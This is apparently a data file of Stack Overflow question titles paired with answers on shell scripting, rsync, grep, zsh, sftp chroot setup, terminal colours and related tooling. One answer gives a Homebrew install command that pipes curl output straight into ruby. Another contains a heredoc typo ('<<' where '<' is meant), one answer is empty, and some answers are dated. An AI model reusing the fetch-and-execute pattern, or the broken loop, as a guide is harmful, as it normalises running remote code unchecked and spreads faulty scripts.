    "rsync exclude a directory but include a subdirectory": "Sometime it's just a detail.\nJust change your include pattern adding a trailing / at the end of include pattern and it'll work:\nrsync -avz --delete --include=specs/install/project1/ \\\n    --exclude=specs/* /srv/http/projects/project/ \\\n    user@server.com:~/projects/project\nOr, in alternative, prepare a filter file like this:\n$ cat << EOF >pattern.txt\n> + specs/install/project1/\n> - specs/*\n> EOF\nThen use the --filter option:\nrsync -avz --delete --filter=\". pattern.txt\" \\\n    /srv/http/projects/project/ \\\n    user@server.com:~/projects/project\nFor further info go to the FILTER RULES section in the rsync(1) manual page.",
    "All newlines are removed when saving cat output into a variable": "The shell is splitting the msgs variable so echo get multiple parameters. You need to quote your variable to prevent this to happen:\necho \"$msgs\"",
    "Where does '.' and '..' come from?": "Excerpt from an interview with Ken Thompson (9-6-89):\nEvery time we made a directory, by convention we put it in another directory called directory - directory, which was dd. Its name was dd and that all the users directories and in fact most other directories, users maintain their own directory systems, had pointers back to dd, and dd got shortened into \u2018dot-dot,\u2019 and dd was for directory-directory.",
    "Multiple statements in if else statement in shell scripting": "Yes you can have multiple statements:\nif [ condition ]; then\n  echo 'foo'\n  echo 'bar'\nelse\n  echo 'hello'\n  echo 'world'\nfi",
    "Write a bash shell script that consumes a constant amount of RAM for a user defined time [closed]": "Even if traditional Bash arrays are not supported, it may still be possible to create array-like variables using the eval command built into the particular shell.\nThe following example script is based on some scripting I did when using BusyBox in an embedded Linux project. BusyBox uses the Almquist shell (also known as A Shell, ash, and sh), which does not support arrays.\n#!/bin/ash\n\nfor index in 1 2 3 4 5; do\n    value=$(($index * 1024))\n    eval array$index=\\\"array[$index]: $value\\\"\ndone\n\nfor i in 1 3 5; do\n    eval echo \\$array$i\ndone\nBe careful with quoting when using eval!\nOutput:\narray[1]: 1024\narray[3]: 3072\narray[5]: 5120\nDepending on your particular scenario, a script similar to the following may suffice.\n#!/bin/ash\n\necho \"Provide sleep time in the form of NUMBER[SUFFIX]\"\necho \"   SUFFIX may be 's' for seconds (default), 'm' for minutes,\"\necho \"   'h' for hours, or 'd' for days.\"\nread -p \"> \" delay\n\necho \"begin allocating memory...\"\nfor index in $(seq 1000); do\n    value=$(seq -w -s '' $index $(($index + 100000)))\n    eval array$index=$value\ndone\necho \"...end allocating memory\"\n\necho \"sleeping for $delay\"\nsleep $delay\nIn my brief testing, this script consumed ~570M to ~575M physical memory* for the specified time period of 5 minutes.\n* Monitored using top and memprof programs in separate tests",
    "Linux shell to restrict sftp users to their home directories?": "OpenSSH\u22654.8 supports a ChrootDirectory directive.\nAdd to /etc/sshd_config or /etc/ssh/sshd_config or whatever your setup's global sshd config file is:\nMatch user ben_files\n        # The following two directives force ben_files to become chrooted\n        # and only have sftp available.  No other chroot setup is required.\n        ChrootDirectory /var/www/vhosts/mydomain.example/files\n        ForceCommand internal-sftp\n        # For additional paranoia, disallow all types of port forwardings.\n        AllowTcpForwarding no\n        GatewayPorts no\n        X11Forwarding no",
    "Achieve Local Function": "Bash does not support local functions, but depending on your specific script and architecture you can control the scope of your function name through subshells.\nBy replacing the {..} with (..) in your definition, you'll get the output you want. The new definition of usage will be limited to the function, but so will e.g. any changes to variables:\n#!/bin/bash\nusage() \n{\n    echo \"Overall Usage\"\n}\n\nfunction_A()\n(                  # <-- Use subshell\n    usage()\n    {\n        echo \"function_A Usage\"\n    }\n\n    for i in \"$@\"; do\n        case $i in\n            --help)\n                usage\n                shift\n                ;;\n            *)\n                echo \"flag provided but not defined: ${i%%=*}\"\n                echo \"See '$0 --help'.\"\n                exit 0\n            ;;\n        esac\n    done\n)\n\nfunction_A --help\nusage",
    "Start a jar file like service in linux [closed]": "You need a Service Wrapper to run the Jar file.\nThere are examples and instructions for init.d here. or for systemd (ubuntu 16+) here",
    "error 1064(42000) while trying to execute mysqldump command [duplicate]": "mysqldump is a command you invoke at the shell prompt, not within the mysql client environment.\nmysql> exit\n$ mysqldump --all-databases > dump.sql",
    "How to reverse lines of a text file?": "In GNU coreutils, there's tac(1)",
    "Shell command for getting mac address in OS X [closed]": "ifconfig en1 gets the interface details for wifi, the mac is on a line starting with ether, and is the second word on that line so:\nifconfig en1 | awk '/ether/{print $2}'",
    "Downloading all the files in a directory with cURL": "If you're not bound to curl, you might want to use wget in recursive mode but restricting it to one level of recursion, try the following;\nwget --no-verbose --no-parent --recursive --level=1 \\\n--no-directories --user=login --password=pass ftp://ftp.myftpsite.com/\n--no-parent : Do not ever ascend to the parent directory when retrieving recursively.\n--level=depth : Specify recursion maximum depth level depth. The default maximum depth is five layers.\n--no-directories : Do not create a hierarchy of directories when retrieving recursively.\n--delete-after : can be added if you need to delete files after downloading.\n--no-host-directories : to download right in '.' current folder, not create directory named by domain.\n--no-clobber : skip downloads that would download to existing files\n--continue : Continue getting a partially-downloaded file for more stability\ncombine with cd : to define the destination directory\nSo this sample can look like following:\ncd /home/destination/folder \\\n&& wget --no-verbose --no-parent --recursive --level=1 \\\n--no-directories --no-host-directories \\\n--no-clobber --continue \\ \n--user=login --password=pass ftp://ftp.myftpsite.com/",
    "Write SSH command over multiple lines": "ssh is in fact just passing a string to the remote host. There this string is given to a shell which is supposed to interpret it (the user's login shell, which is typically something like bash). So whatever you want to execute needs to be interpretable by that remote login shell, that's the whole rule you have to stick to.\nYou can indeed just use newlines within the command string:\nssh alfe@sweethome \"\n  ls /home/alfe/whatever\n  ping foreignhost\n  date\n  rm foobar\n\"",
    "Error for convert command in command line": "You can also make it with help of Homebrew - which is quite nice and popular package manager\nTo Install homeBrew past in your terminal\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\nTo install imagemagick past in the terminal\nbrew install imagemagick",
    "Shell script change directory with variable": "You variable contains a carriage return. Try saying:\ncd $(echo $RED_INSTANCE_NAME | tr -d '\\r')\nand it should work. In order to remove the CR from the variable you can say:\nRED_INSTANCE_NAME=$(echo $RED_INSTANCE_NAME | tr -d '\\r')\nThe following would illustrate the issue:\n$ mkdir abc\n$ foo=abc$'\\r'\n$ echo \"${foo}\"\nabc\n$ cd \"${foo}\"\n: No such file or directory\n$ echo $foo | od -x\n0000000 6261 0d63 000a\n0000005\n$ echo $foo | tr -d '\\r' | od -x\n0000000 6261 0a63\n0000004\n$ echo $'\\r' | od -x\n0000000 0a0d\n0000002",
    "linux-shell: renaming files to creation time": "Naming based on file system date\nIn the linux shell:\nfor f in *.jpg\ndo\n    mv -n \"$f\" \"$(date -r \"$f\" +\"%Y%m%d_%H%M%S\").jpg\"\ndone\nExplanation:\nfor f in *.jpg\ndo\nThis starts the loop over all jpeg files. A feature of this is that it will work with all file names, even ones with spaces, tabs or other difficult characters in the names.\nmv -n \"$f\" \"$(date -r \"$f\" +\"%Y%m%d_%H%M%S\").jpg\"\nThis renames the file. It uses the -r option which tells date to display the date of the file rather than the current date. The specification +\"%Y%m%d_%H%M%S\" tells date to format it as you specified.\nThe file name, $f, is placed in double quotes where ever it is used. This assures that odd file names will not cause errors.\nThe -n option to mv tells move never to overwrite an existing file.\ndone\nThis completes the loop.\nFor interactive use, you may prefer that the command is all on one line. In that case, use:\nfor f in *.jpg; do mv -n \"$f\" \"$(date -r \"$f\" +\"%Y%m%d_%H%M%S\").jpg\"; done\nNaming based on EXIF Create Date\nTo name the file based on the EXIF Create Date (instead of the file system date), we need exiftool or equivalent:\nfor f in *.jpg\ndo\n    mv -n \"$f\" \"$(exiftool -d \"%Y%m%d_%H%M%S\" -CreateDate \"$f\" | awk '{print $4\".jpg\"}')\"\ndone\nExplanation:\nThe above is quite similar to the commands for the file date but with the use of exiftool and awk to extract the EXIF image Create Date.\nThe exiftool command provides the date in a format like:\n$ exiftool -d \"%Y%m%d_%H%M%S\"  -CreateDate sample.jpg\nCreate Date                     : 20121027_181338\nThe actual date that we want is the fourth field in the output.\nWe pass the exiftool output to awk so that it can extract the field that we want:\nawk '{print $4\".jpg\"}'\nThis selects the date field and also adds on the .jpg extension.",
    "encoding of file shell script": "I'd just use\nfile -bi myfile.txt\nto determine the character encoding of a particular file.\nA solution with an external dependency but I suspect file is very common nowadays among all semi-modern distro's.\nEDIT:\nAs a response to Laurence Gonsalves' comment: b is the option to be 'brief' (not include the filename) and i is the shorthand equivalent of --mime so the most portable way (including Mac OSX) then probably is:\nfile --mime myfile.txt ",
    "Shortening my prompt in Zsh": "Old question, I know, but as an alternative solution I just discovered powerlevel9k, an extension of agnoster (they appear practically identical bar a fair few tweaks), which has this functionality built in.\nJust set it as your zsh theme, then in .zshrc set\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=2\nwhich ensures that only two directories are listed.\nAlternate options are outlined in the readme.",
    "executing bash loop while command is running": "until is the opposite of while. It's nothing to do with doing stuff while another command runs. For that you need to run your task in the background with &.\ncp SOURCE DEST &\npid=$!\n\n# If this script is killed, kill the `cp'.\ntrap \"kill $pid 2> /dev/null\" EXIT\n\n# While copy is running...\nwhile kill -0 $pid 2> /dev/null; do\n    # Do stuff\n    ...\n    sleep 1\ndone\n\n# Disable the trap on a normal exit.\ntrap - EXIT\nkill -0 checks if a process is running. Note that it doesn't actually signal the process and kill it, as the name might suggest. Not with signal 0, at least.",
    "Xcode custom shell scripts are slowing down the compiling time": "I can't enlighten you but I can tell you how I stopped mine from running. This also happened after installing Cocoapods. In my main project's Target, under Build Phases, I noticed two entries entitled Check Pods Manifest.lock and another called Copy Pods Resources.\nUnder both there was an unchecked option Run script only when installing. I checked both and at least for now my projects build and run fine without running the scripts.\nThis is kind of a crappy answer because I can't really give you any more information, and it might not even work for your case, so hopefully someone comes along and enlightens us.\nPOSSIBLE EXTERNAL BUNDLE ISSUES\nSo I just had a frustrating experience debugging an issue where a pod installed library's NSLocalized strings file weren't working. Turns out it was because I checked the option mentioned above. Pods-resources.sh, which had the lines to install the bundle, wasn't running in debug mode. It was only running when installing - of course! Something to watch out for.\nMore info in this question:\nNSLocalizedStringFromTable not working in CocoaPod dependency",
    "Verbose output of shell script": "You don't say what sort of shell you're running. If you're using sh/bash, try\nsh -x script_name\nto run your script in a verbose/debug mode. This will dump out all the commands you execute, variable values etc. You don't want to do this normally since it'll provide a ton of output, but it's useful to work out what's going on.\nAs noted in the comments, you can add this flag to your #!/bin/bash invocation in your script.",
    "Connecting n commands with pipes in a shell?": "Nothing complex here, just have in mind that the last command should output to the original process' file descriptor 1 and the first should read from original process file descriptor 0. You just spawn the processes in order, carrying along the input side of the previous pipe call.\nSo, here's are the types:\n#include <unistd.h>\n\nstruct command\n{\n  const char **argv;\n};\nMake a helper function with a simple well defined semantics:\nint\nspawn_proc (int in, int out, struct command *cmd)\n{\n  pid_t pid;\n\n  if ((pid = fork ()) == 0)\n    {\n      if (in != 0)\n        {\n          dup2 (in, 0);\n          close (in);\n        }\n\n      if (out != 1)\n        {\n          dup2 (out, 1);\n          close (out);\n        }\n\n      return execvp (cmd->argv [0], (char * const *)cmd->argv);\n    }\n\n  return pid;\n}\nAnd here's the main fork routine:\nint\nfork_pipes (int n, struct command *cmd)\n{\n  int i;\n  pid_t pid;\n  int in, fd [2];\n\n  /* The first process should get its input from the original file descriptor 0.  */\n  in = 0;\n\n  /* Note the loop bound, we spawn here all, but the last stage of the pipeline.  */\n  for (i = 0; i < n - 1; ++i)\n    {\n      pipe (fd);\n\n      /* f [1] is the write end of the pipe, we carry `in` from the prev iteration.  */\n      spawn_proc (in, fd [1], cmd + i);\n\n      /* No need for the write end of the pipe, the child will write here.  */\n      close (fd [1]);\n\n      /* Keep the read end of the pipe, the next child will read from there.  */\n      in = fd [0];\n    }\n\n  /* Last stage of the pipeline - set stdin be the read end of the previous pipe\n     and output to the original file descriptor 1. */  \n  if (in != 0)\n    dup2 (in, 0);\n\n  /* Execute the last stage with the current process. */\n  return execvp (cmd [i].argv [0], (char * const *)cmd [i].argv);\n}\nAnd a small test:\nint\nmain ()\n{\n  const char *ls[] = { \"ls\", \"-l\", 0 };\n  const char *awk[] = { \"awk\", \"{print $1}\", 0 };\n  const char *sort[] = { \"sort\", 0 };\n  const char *uniq[] = { \"uniq\", 0 };\n\n  struct command cmd [] = { {ls}, {awk}, {sort}, {uniq} };\n\n  return fork_pipes (4, cmd);\n}\nAppears to work. :)",
    "How to check if npm script exists?": "EDIT: As mentioned by Marie and James if you only want to run the command if it exists, npm has an option for that:\nnpm run test --if-present\nThis way you can have a generic script that work with multiple projects (that may or may not have an specific task) without having the risk of receiving an error.\nSource: https://docs.npmjs.com/cli/run-script\nEDIT\nYou could do a grep to check for the word test:\nnpm run | grep -q test\nthis return true if the result in npm run contains the word test\nIn your script it would look like this:\n#!/bin/bash\n\nROOT_PATH=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\nBASE_PATH=\"${ROOT_PATH}/../..\"\n\nwhile read MYAPP; do # reads from a list of projects\n  PROJECT=\"${MYAPP}\"\n  FOLDER=\"${BASE_PATH}/${PROJECT}\"\n  cd \"$FOLDER\"\n  if npm run | grep -q test; then\n    npm run test\n    echo \"\"\n  fi\ndone < \"${ROOT_PATH}/../assets/apps-manifest\"\nIt just would be a problem if the word test is in there with another meaning Hope it helps",
    "RGB values of the colors in the Ansi extended colors index (17-255)": "The 256 color table and its partitioning\nThe color range of a 256 color terminal consists of 4 parts, often 5, in which case you actually get 258 colors:\nColor numbers 0 to 7 are the default terminal colors, the actual RGB value of which is not standardized and can often be configured.\nColor numbers 8 to 15 are the \"bright\" colors. Most of the time these are a lighter shade of the color with index - 8. They are also not standardized and can often be configured. Depending on terminal and shell, they are often used instead of or in conjunction with bold font faces.\nColor numbers 16 to 231 are RGB colors. These 216 colors are defined by 6 values on each of the three RGB axes. That is, instead of values 0 - 255, each color only ranges from 0 - 5.\nThe color number is then calculated like this:\nnumber = 16 + 36 * r + 6 * g + b\nwith r, g and b in the range 0 - 5.\nThe color numbers 232 to 255 are grayscale with 24 shades of gray from dark to light.\nThe default colors for foreground and background. In many terminals they can be configured independently from the 256 indexed colors, giving an additional two configurable colors . You get them when not setting any other color or disabling other colors (i.e. print '\\e[m').\nSome sources:\nurxvt manpage:\nIn addition to the default foreground and background colours, urxvt can display up to 88/256 colours: 8 ANSI colours plus high-intensity (potentially bold/blink) versions of the same, and 72 (or 240 in 256 colour mode) colours arranged in an 4x4x4 (or 6x6x6) colour RGB cube plus a 8 (24) colour greyscale ramp.\nxterm manpage:\nThese specify the colors for the 256-color extension. The default resource values are for colors 16 through 231 to make a 6x6x6 color cube, and colors 232 through 255 to make a grayscale ramp.\nWikipedia article on ANSI escape codes (which in turn itself is lacking a citation on the topic)\nDefault RGB values\nTheoretically, in order to get an equally distributed range of colors, the RGB values for the colors in the range 16 - 231 could be calculated like this:\n# example in Python: // is integer divison, % is modulo\nrgb_R = ((number - 16) // 36) * 51\nrgb_G = (((number - 16) % 36) // 6) * 51\nrgb_B = ((number - 16) % 6) * 51\nBut it seems that the actual method is different:\nAny terminal emulators I tested seems to follow XTerm and map the values [0, 1, 2, 3, 4, 5] for red, green and blue to the values [0, 95, 135, 175, 215, 255] on the RGB color axes. (I tested with XTerm (297) URxvt (v9.19), ROXTerm (2.8.1), gnome-terminal (3.6.2) and xfce4-terminal (0.6.3))\nThe RGB values for a given index can be calculated with this algorithm:\n# example in Python: 'a = b if c else d' is 'a = (c) ? b : d` in C, Perl, etc.\nindex_R = ((number - 16) // 36)\nrgb_R = 55 + index_R * 40 if index_R > 0 else 0\nindex_G = (((number - 16) % 36) // 6)\nrgb_G = 55 + index_G * 40 if index_G > 0 else 0\nindex_B = ((number - 16) % 6)\nrgb_B = 55 + index_B * 40 if index_B > 0 else 0\nThe grayscale seems to follow this simple formula:\nrgb_R = rgb_G = rgb_B = (number - 232) * 10 + 8\n256colres.pl in the root of the XTerm sources (version 313) uses a similar algorithm to generate 256colres.h, which contains the color definitions for 256 color mode:\n$line1=\"COLOR_RES(\\\"%d\\\",\";\n$line2=\"\\tscreen.Acolors[%d],\";\n$line3=\"\\tDFT_COLOR(\\\"rgb:%2.2x/%2.2x/%2.2x\\\")),\\n\";\n\n# colors 16-231 are a 6x6x6 color cube\nfor ($red = 0; $red < 6; $red++) {\n    for ($green = 0; $green < 6; $green++) {\n    for ($blue = 0; $blue < 6; $blue++) {\n        $code = 16 + ($red * 36) + ($green * 6) + $blue;\n        printf($line1, $code);\n        printf($line2, $code);\n        printf($line3,\n           ($red ? ($red * 40 + 55) : 0),\n           ($green ? ($green * 40 + 55) : 0),\n           ($blue ? ($blue * 40 + 55) : 0));\n    }\n    }\n}\n\n# colors 232-255 are a grayscale ramp, intentionally leaving out\n# black and white\n$code=232;\nfor ($gray = 0; $gray < 24; $gray++) {\n    $level = ($gray * 10) + 8;\n    $code = 232 + $gray;\n    printf($line1, $code);\n    printf($line2, $code);\n    printf($line3,\n       $level, $level, $level);\n}\nShowing available colors in a terminal\nHere is a zsh function that prints all colors on a 256 color terminal (if TERM is set to a 256 color value):\nfunction termcolors () \n{\n    print TERM\n    print -P \"Foreground: >\u2588<\"\n    print -P \"Background: >%S\u2588%s<\\n\"\n\n    print \"      0 1 2 3 4 5 6 7\" \n    for b (0 1)\n    do\n        printf \"%d %2d \" $b $(( 8 * b ))\n        for r (0 1 2 3 4 5 6 7)\n        do\n            c=$(( 8 * b + r ))\n            print -nP \"%K{$c}  %k\"\n        done\n        printf \" %2d\\n\" $(( 8 * b + 7 ))\n    done\n\n    print\n\n    print RGB\n    for r (0 1 2 3 4 5)\n    do \n        print \"$r $(( 16 + 36 * r )) - $(( 16 + 36 * r + 35 ))\\n       0 1 2 3 4 5\"\n        for g (0 1 2 3 4 5)\n        do\n            printf \"%d %3d \" $g $(( 16 + 36 * r + 6 * g ))\n            for b (0 1 2 3 4 5)\n            do\n                c=$(( 16 + 36 * r + 6 * g + b ))\n                print -nP \"%K{$c}  %k\"\n            done\n            printf \" %3d\\n\" $(( 16 + 36 * r + 6 * g + 5))\n        done\n        print\n    done\n\n    print\n\n    print GRAY\n    for g in $(seq 0 23)\n    do\n        c=$(( 232 + g ))\n        printf \"%2d %3d \" $g $c\n        print -P \"%K{$c}  %k\"\n    done\n}\nChanging RGB values during runtime\nIn some terminals (at least xterm, gnome-terminal, termite and urxvt) all those colors can be changed during runtime by sending one of the following XTerm Control Sequences:\nOSC 4; c ; spec BEL\nOSC 4; c ; spec ST\nwhere:\nOSC is the escape character (\\e or \\033) followed by ]\nc is the color number (0 - 255)\nspec is a color specification (e.g. red, #ff0000, rgb:ff/00/00, rgbi:1/0/0 - what actually works might depend on the terminal)\nBEL is the bell character (\\a or \\007)\nST is the string terminator \\e\\\\ or \\033\\\\\nThese control sequences can be sent by simply printing them with echo:\necho -en \"\\e]4;COLOR;SPEC\\a\"\necho -en \"\\e]4;COLOR;SPEC\\a\"\nFor example, in order to set color number 5 (usually some shade of magenta) to red, either of these should work:\necho -en \"\\e]4;5;red\\a\"\necho -en \"\\e]4;5;#ff0000\\e\\\\\"\necho -en \"\\033]4;5;rgb:ff/00/00\\007\"\nThose colors can be reset to their (configured) default with one of the control sequences\nOSC 104 ; c BEL\nOSC 104 ; c ST\nSo the following loop will reset all colors from 0 to 255 to their configured or default value:\nfor c in {0..255}; do\n  echo -en \"\\e]104;$c\\a\"\ndone\nFor the default foreground and background colors the control sequences are OSC 10 ; spec BEL and OSC 11 ; spec BEL, respectively. For example:\necho -en \"\\e]10;red\\a\"\necho -en \"\\e]11;green\\a\"\nThose can be reset with OSC 110 BEL and OSC 111 BEL respectively:\necho -en \"\\e]110\\a\"\necho -en \"\\e]111\\a\"",
    "Piping tail output though grep twice": "I believe the problem here is that the first grep is buffering the output which means the second grep won't see it until the buffer is flushed.\nTry adding the --line-buffered option on your first grep:\ntail -f access_log | grep --line-buffered \"127.0.0.1\" | grep -v \".css\"\nFor more info, see \"BashFAQ/009 -- What is buffering? Or, why does my command line produce no output: tail -f logfile | grep 'foo bar' | awk ...\"",
    "Is there a better Windows command-line shell? [closed]": "Microsoft's just released Powershell. (about 2 years ago)\nI've already downloaded it; didn't try it much, but seems a nice tool.",
    "input of while loop to come from output of `command`": "This works in bash:\nwhile read line; do  \n  ARRAY[$c]=\"$line\"\n  c=$((c+1))  \ndone < <(tcpdump -n -r \"$pcap\")",
    "How Do You Rename a Table in HBase?": "To rename a table in HBase, apparently you have to use snapshots. So, you take a snapshot of the table and then clone it as a different name.\nIn the HBase shell:\ndisable 'tableName'\nsnapshot 'tableName', 'tableSnapshot'\nclone_snapshot 'tableSnapshot', 'newTableName'\ndelete_snapshot 'tableSnapshot'\ndrop 'tableName'\nSOURCE\nhttp://hbase.apache.org/book.html#table.rename",
    "Match empty lines in a file with 'grep'": "The regular expression to match the end of the line is $, not \\n (since grep works a line at a time, it ignores the newlines between lines).\ngrep -c '^$' myfile.txt",
    "grep excluding file name pattern": "You can quote the pattern:\ngrep -r --exclude=\"*.cmd\"  \"ckim\" ./\nPS. ./ is the current directory",
    "Variable expansion is different in zsh from that in bash": "The difference is that (by default) zsh does not do word splitting for unquoted parameter expansions.\nYou can enable \u201cnormal\u201d word splitting by setting the SH_WORD_SPLIT option or by using the = flag on an individual expansion:\nls ${=args}\nor\nsetopt SH_WORD_SPLIT\nls $args\nIf your target shells support arrays (ksh, bash, zsh), then you may be better off using an array:\nargs=(-a -l)\nls \"${args[@]}\"\nFrom the zsh FAQ:\n2.1: Differences from sh and ksh\nThe classic difference is word splitting, discussed in question 3.1; this catches out very many beginning zsh users.\n3.1: Why does $var where var=\"foo bar\" not do what I expect? is the FAQ that covers this question.\nFrom the zsh Manual:\n14.3 Parameter Expansion\nNote in particular the fact that words of unquoted parameters are not automatically split on whitespace unless the option SH_WORD_SPLIT is set; see references to this option below for more details. This is an important difference from other shells.\nSH_WORD_SPLIT\nCauses field splitting to be performed on unquoted parameter expansions.",
    "conditional binary operator expected in shell script": "Problem is in your if [[...]] expression where you are using 2 grep commands without using command substitution i.e. $(grep 'pattern' file).\nHowever instead of:\nif [[ grep $check_val1 $log -ne $check_val1 || grep $check_val2 $log -ne $check_val2 ]]; then\nYou can use grep -q:\nif grep -q -e \"$check_val1\" -e \"$check_val2\" \"$log\"; then\nAs per man grep:\n-q, --quiet, --silent\n         Quiet mode: suppress normal output.  grep will only search a file until a match \n         has been found, making searches potentially less expensive.",
    "Is the shell's `source` POSIX-standard?": "It's there under \"dot\".\nNAME\ndot - execute commands in the current environment\nSYNOPSIS\n. file\n[etc.]",
    "How to append a file with the existing one using CURL?": "Use the shell's appending output redirection (>>) rather than curl's --output option.\ncurl http://192.99.8.170:8098/stream >> test.pls",
    "Running R Scripts with Plots": "",
    "Why does Fish shell have dark blue as the default color for directories": "I realized my mistake was with iTerm and not with Fish.\nPress CMD+i with an iTerm window open, then click the Colors tab and set it something nicer.\nNot sure why this problem didn't show up before, but it seems like it was triggered by the new Fish installation.",
    "How to automatically pipe to less if the result is more than a page on my shell?": "Pipe it to less -F aka --quit-if-one-screen:\nCauses less to automatically exit if the entire file can be dis- played on the first screen.",
    "What does 'set -x' do in Dockerfile?": "The -e causes the command to stop on any errors. A more typical syntax is to separate commands with && to stop on any error.\nThe -x causes the shell to output each command being run. This is useful for debugging scripts.\nFrom the bash man page under set:\n-e Exit immediately if a pipeline (which may consist of a single simple command), a list, or a compound command (see SHELL GRAMMAR above), exits with a non-zero status. The shell does not exit if the command that fails is part of the command list immediately following a while or until keyword, part of the test following the if or elif reserved words, part of any com\u2010 mand executed in a && or || list except the command following the final && or ||, any command in a pipeline but the last, or if the command's return value is being inverted with !. If a compound command other than a subshell returns a non-zero status because a command failed while -e was being ignored, the shell does not exit. A trap on ERR, if set, is executed before the shell exits. This option applies to the shell environment and each subshell envi\u2010 ronment separately (see COMMAND EXECUTION ENVIRONMENT above), and may cause subshells to exit before executing all the commands in the subshell.\nIf a compound command or shell function executes in a context where -e is being ignored, none of the commands executed within the compound command or function body will be affected by the -e setting, even if -e is set and a command returns a failure status. If a compound command or shell function sets -e while executing in a context where -e is ignored, that setting will not have any effect until the compound command or the command containing the function call completes.\n...\n-x After expanding each simple command, for command, case command, select command, or arithmetic for command, display the expanded value of PS4, followed by the command and its expanded arguments or associated word list.",
    "Automator Variable in shell script": "To complement @Ned Deily's answer:\n(Written as of OS X 10.9.2, still current as of OSX 10.10)\nIt is often not necessary to create and use explicit variables in Automator (using the Set Value of Variable and Get Value of Variable actions).\nThe previous action's output is automatically passed to a Run Shell Script action.\nBy default, the data is passed via stdin, however.\nIf you want it passed as arguments ($1, $2, ... - also accessible as an array via $@) instead, select as arguments from the Pass input: list on the right, as illustrated here:\nIn this example, the selected Finder items are passed as POSIX-style paths to the shell script.\nThat said, having a shell script process the data via stdin (using read -r in a loop) works, too:",
    "Concatenating two string variables in bash appending newline": "New lines are very much there in the variable \"$final_list\". echo it like this with double quotes:\necho \"$final_list\"\nurl1\nurl2\nurl3\nOR better use printf:\nprintf \"%s\\n\" \"$final_list\"\nurl1\nurl2\nurl3",
    "Why do I get \"/bin/sh: Argument list too long\" when passing quoted arguments?": "TL;DR\nA single argument must be shorter than MAX_ARG_STRLEN.\nAnalysis\nAccording to this link:\nAnd as additional limit since 2.6.23, one argument must not be longer than MAX_ARG_STRLEN (131072). This might become relevant if you generate a long call like \"sh -c 'generated with long arguments'\".\nThis is exactly the \"problem\" identified by the OP. While the number of arguments allowed may be quite large (see getconf ARG_MAX), when you pass a quoted command to /bin/sh the shell interprets the quoted command as a single string. In the OP's example, it is this single string that exceeds the MAX_ARG_STRLEN limit, not the length of the expanded argument list.\nImplementation Specific\nArgument limits are implementation specific. However, this Linux Journal article suggests several ways to work around them, including increasing system limits. This may not be directly applicable to the OP, but it nonetheless useful in the general case.\nDo Something Else\nThe OP's issue isn't actually a real problem. The question is imposing an arbitrary constraint that doesn't solve a real-world problem.\nYou can work around this easily enough by using loops. For example, with Bash 4:\nfor i in {1..100000}; do /bin/sh -c \"/bin/true $i\"; done\nworks just fine. It will certainly be slow, since you're spawning a process on each pass through the loop, but it certainly gets around the command-line limit you're experiencing.\nDescribe Your Real Problem\nIf a loop doesn't resolve your issue, please update the question to describe the problem you're actually trying to solve using really long argument lists. Exploring arbitrary line-length limits is an academic exercise, and not on-topic for Stack Overflow.",
    "How to check if a file's size is greater than a certain value in Bash": "A couple of syntactic issues.\nThe variable definitions in Bash do not take spaces. It should have been MAXSIZE=500000, without spaces.\nThe way comparison operation is done is incorrect. Instead of if [ (( $FILESIZE > MAXSIZE)) ];, you could very well use Bash\u2019s own arithmetic operator alone and skip the [ operator to just if (( FILESIZE > MAXSIZE)); then \nIf you are worried about syntax issues in your script, use ShellCheck to syntax check your scripts and fix the errors as seen from it.\nAs a general coding practice, use lowercase user-defined variables in Bash to avoid confusing them with the special environment variables which are interpreted for different purposes by the shell (e.g., $HOME and $SHELL).",
    "How to get the process id of a bash subprocess on command line": "Thanks to all of you for spending your valuable time in finding answer to my question here.\nHowever I am now answering my own question since I've found a hack way to get this pid on bash ver < 4 (will work on all the versions though). Here is the command:\necho $$; ( F='/tmp/myps'; [ ! -f $F ] && echo 'echo $PPID' > $F; )\nIt prints:\n5642\n13715\nWhere 13715 is the pid of the subshell. To test this when I do:\necho $$; ( F='/tmp/myps'; [ ! -f $F ] && echo 'echo $PPID' > $F; bash $F; ps; )\nI get this:\n5642\n13773\n  PID   TT  STAT      TIME COMMAND\n 5642 s001  S      0:02.07 -bash\n13773 s001  S+     0:00.00 -bash\nTelling me that 13773 is indeed the pid of the subshell.\nNote: I reverted back to my original solution since as @ChrisDodd commented that echo $$; ( bash -c 'echo $PPID'; ) doesn't work Linux. Above solution of mine works both on Mac and Linux.",
    "How do I find the latest version of an artifact from a maven repository": "You can use the Maven Dependency Plugin goal get together with LATEST as version for your artifact:\nmvn org.apache.maven.plugins:maven-dependency-plugin:2.8:get\n    -DremoteRepositories=<URL_to_your_maven_repo>\n    -Dartifact=<group_id>:<artifact_id>:LATEST\n    -Dpackaging=jar\n    -Ddest=<target_dir>/<artifact_name>.jar",
    "grep invert search with context": "If the lines are all unique you could grep the lines you want to remove into a file, and then use that file to remove the lines from the original, e.g.\ngrep -C 2 \"line I don't want\" < A.txt > B.txt\ngrep -f B.txt A.txt",
    "How do I launch files in C#": "Use:\nSystem.Diagnostics.Process.Start(filePath);\nIt will use the default program that would be opened as if you just clicked on it. Admittedly it doesn't let you choose the program that will run... but assuming that you want to mimic the behaviour that would be used if the user were to double-click on the file, this should work just fine.",
    "Is there a way to glob a directory in Ruby but exclude certain directories?": "I know this is 4 years late but for anybody else that might run across this question you can exclude from Dir the same way you would exclude from Bash wildcards:\nDir[\"lib/{[!errors/]**/*,*}.rb\"]\nWhich will exclude any folder that starts with \"errors\" you could even omit the / and turn it into a wildcard of sorts too if you want.",
    "Bash while read loop breaking early [duplicate]": "Chris is correct. The source of the loop breaking was SSH using stdin, however guns is correct in is usage of a looping methodology.\nIf you are looping through input (a file with a list of hostnames for example), and calling SSH, you need to pass the -n parameter, otherwise your loop based on input will fail.\nwhile read host; do\n  ssh -n $host \"remote command\" >> output.txt\ndone << host_list_file.txt",
    "How to check if a shell script $1 parameter is an absolute or relative path? [duplicate]": "[ ... ] doesn't do pattern matching. /* is being expanded to the contents of /, so effectively you have\nif [ \"$DIR\" = /bin /boot /dev /etc /home /lib /media ... /usr /var ]\nor something similar. Use [[ ... ]] instead.\nif [[ \"$DIR\" = /* ]]; then\nFor POSIX compliance, or if you just don't have a [[ that does pattern matching, use a case statement.\ncase $DIR in\n  /*) echo \"absolute path\" ;;\n  *) echo \"something else\" ;;\nesac",
